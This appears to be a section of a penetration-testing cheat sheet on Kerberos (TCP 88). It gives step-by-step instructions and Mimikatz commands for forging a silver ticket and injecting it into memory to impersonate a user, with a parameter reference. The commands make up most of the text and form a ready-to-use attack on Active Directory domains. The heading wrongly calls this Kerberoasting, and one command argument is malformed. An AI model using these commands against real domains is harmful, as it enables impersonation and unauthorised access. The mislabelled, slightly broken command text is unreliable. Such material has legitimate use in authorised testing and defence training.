## TCP 88  kerberos


### Kerberoasting

##### Generating a silver ticket

1. Obtain access to a domain user account
2. Obtain a password or hash for a service account on a computer or the computer account itself.
3. Obtain a domain SID
```
whoami /user
#domain sid value is all SID characters except for the last 4.
```

###### Using Mimikatz
```
privilege::debug
kerberos::golden /sid:<domain sid> /domain:<domain name> /ptt /target:<host> /service:<service being attacked> /rc4<NTLM password hash> /id:<forged user id> /user:<forged username>

syntax reference:
/domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.
/sid – the SID of the domain.
/user – username to impersonate
/groups (optional) – group RIDs the user is a member of (the first is the primary group)
default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
/ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
/ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
/id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).
/startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
/endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
/renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
```

##### Checking ticket in memory
```
#from powershell
klist
```
#### Additional references
https://adsecurity.org/?p=2011
